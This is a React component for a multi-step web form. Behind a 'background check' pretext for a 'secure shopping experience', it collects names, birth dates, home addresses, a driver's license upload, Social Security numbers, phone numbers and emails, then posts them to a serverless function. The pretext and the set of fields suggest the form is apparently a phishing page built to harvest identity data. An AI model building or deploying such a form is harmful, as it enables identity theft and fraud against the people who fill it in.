import React, { useState } from "react";
import "../css/Multiform.css";
import "animate.css/animate.min.css";
import { motion } from "framer-motion";

const MultiStepForm = () => {
  const [showPreload, setShowPreload] = useState(true);
  const [step, setStep] = useState(1);
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    dobDay: "",
    dobMonth: "",
    dobYear: "",
    streetNumber: "",
    streetName: "",
    city: "",
    state: "",
    zip: "",
    licenseFile: null,
    ssn: "",
    phone: "",
    email: "",
  });

  const preloadText = `Welcome. To ensure a secure shopping experience, we require a brief background check. This process typically takes 24–72 hours. During this time, your account remains accessible for any updates you may wish to make.`.split(" ");

  const handleChange = (e) => {
    const { name, value, files } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: files ? files[0] : value,
    }));
  };

  const nextStep = () => {
    const {
      firstName, lastName, dobDay, dobMonth, dobYear,
      streetNumber, streetName, city, state, zip,
      licenseFile, ssn, phone, email
    } = formData;

    if (step === 1 && (!firstName || !lastName || !dobDay || !dobMonth || !dobYear || !streetNumber || !streetName || !city || !state || !zip)) {
      alert("Please fill out all required fields before proceeding.");
      return;
    }
    if (step === 2 && (!licenseFile || !ssn)) {
      alert("Please upload your license and enter your SSN.");
      return;
    }
    if (step === 3 && (!phone || !email)) {
      alert("Please provide your phone number and email address.");
      return;
    }
    setStep((prev) => prev + 1);
  };

  const prevStep = () => setStep((prev) => prev - 1);

  const handleSubmit = async () => {
    const formPayload = new FormData();

    Object.entries(formData).forEach(([key, value]) => {
      if (value) {
        formPayload.append(key, value);
      }
    });

    try {
      const token = await window.Clerk?.session?.getToken?.(); // optional: only if using Clerk
      const response = await fetch("/.netlify/functions/submitForm", {
        method: "POST",
        headers: {
          ...(token && { Authorization: `Bearer ${token}` }),
        },
        body: formPayload,
      });

      const result = await response.json();
      if (response.ok) {
        alert("Form submitted successfully!");
        setStep(1);
      } else {
        alert("Submission failed: " + result.error);
      }
    } catch (err) {
      console.error("Submission error:", err);
      alert("An error occurred while submitting the form.");
    }
  };

  const steps = ["Your Information", "Upload License", "Contact Info", "Summary"];

  const renderPreload = () => (
    <div className="has-background-black has-text-white" style={{ height: "100vh", width: "100vw", display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center", padding: "2rem", textAlign: "center" }}>
      <h1 className="title is-3 has-text-white animate__animated animate__fadeInDown animate__faster">Welcome</h1>
      <motion.p className="subtitle is-5 has-text-white" style={{ maxWidth: "600px", marginBottom: "2rem", display: "flex", flexWrap: "wrap" }} initial="hidden" animate="visible" variants={{ visible: { transition: { staggerChildren: 0.1 } } }}>
        {preloadText.map((word, index) => (
          <motion.span key={index} variants={{ hidden: { opacity: 0, y: 10 }, visible: { opacity: 1, y: 0, transition: { duration: 0.8, ease: [0.25, 0.1, 0.25, 1] } } }} style={{ marginRight: "6px", display: "inline-block" }}>{word}</motion.span>
        ))}
      </motion.p>
      <motion.button className="button is-light is-medium" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: preloadText.length * 0.1 + 0.5, duration: 1 }} onClick={() => setShowPreload(false)}>Continue →</motion.button>
    </div>
  );

  const renderFields = () => {
    switch (step) {
      case 1:
        return (
          <>
            <input name="firstName" placeholder="First Name" className="input mb-3" value={formData.firstName} onChange={handleChange} />
            <input name="lastName" placeholder="Last Name" className="input mb-3" value={formData.lastName} onChange={handleChange} />
            <input name="dobDay" placeholder="DOB Day" className="input mb-3" value={formData.dobDay} onChange={handleChange} />
            <input name="dobMonth" placeholder="DOB Month" className="input mb-3" value={formData.dobMonth} onChange={handleChange} />
            <input name="dobYear" placeholder="DOB Year" className="input mb-3" value={formData.dobYear} onChange={handleChange} />
            <input name="streetNumber" placeholder="Street Number" className="input mb-3" value={formData.streetNumber} onChange={handleChange} />
            <input name="streetName" placeholder="Street Name" className="input mb-3" value={formData.streetName} onChange={handleChange} />
            <input name="city" placeholder="City" className="input mb-3" value={formData.city} onChange={handleChange} />
            <input name="state" placeholder="State" className="input mb-3" value={formData.state} onChange={handleChange} />
            <input name="zip" placeholder="ZIP" className="input mb-3" value={formData.zip} onChange={handleChange} />
          </>
        );
      case 2:
        return (
          <>
            <input type="file" name="licenseFile" className="input mb-3" onChange={handleChange} />
            <input name="ssn" placeholder="SSN" className="input mb-3" value={formData.ssn} onChange={handleChange} />
          </>
        );
      case 3:
        return (
          <>
            <input name="phone" placeholder="Phone" className="input mb-3" value={formData.phone} onChange={handleChange} />
            <input name="email" placeholder="Email" className="input mb-3" value={formData.email} onChange={handleChange} />
          </>
        );
      case 4:
        return (
          <div className="content has-text-white">
            <h2 className="title is-4">Summary</h2>
            <p><strong>Name:</strong> {formData.firstName} {formData.lastName}</p>
            <p><strong>DOB:</strong> {formData.dobMonth} {formData.dobDay}, {formData.dobYear}</p>
            <p><strong>Address:</strong> {formData.streetNumber} {formData.streetName}, {formData.city}, {formData.state} {formData.zip}</p>
            <p><strong>SSN:</strong> {formData.ssn}</p>
            <p><strong>Phone:</strong> {formData.phone}</p>
            <p><strong>Email:</strong> {formData.email}</p>
           
          </div>
        );
      default:
        return null;
    }
  };

  if (showPreload) return renderPreload();

  return (
    <div className="columns is-centered is-vcentered has-background-black" style={{ minHeight: "100vh" }}>
      <div className="column is-8 box" style={{ display: "flex", padding: 0 }}>
        <aside className="column is-4 has-background-dark p-5" style={{ color: "#fff", borderTopLeftRadius: "8px", borderBottomLeftRadius: "8px" }}>
          {steps.map((label, index) => (
            <div key={index} className={`mb-5 ${index + 1 === step ? "has-text-white" : "has-text-grey-light"}`}>
              <p className="has-text-weight-bold is-size-6">STEP {index + 1}</p>
              <p className="is-size-5">{label}</p>
            </div>
          ))}
        </aside>
        <div className="column is-8 p-6">
          {renderFields()}
          <div className="mt-5 is-flex is-justify-content-space-between">
            {step > 1 && <button className="button is-light" onClick={prevStep}>← Back</button>}
            {step < 4 && <button className="button is-link" onClick={nextStep}>Next Step →</button>}
            {step === 4 && <button className="button is-success" onClick={handleSubmit}>Submit</button>}
          </div>
        </div>
      </div>
    </div>
  );
};

export default MultiStepForm;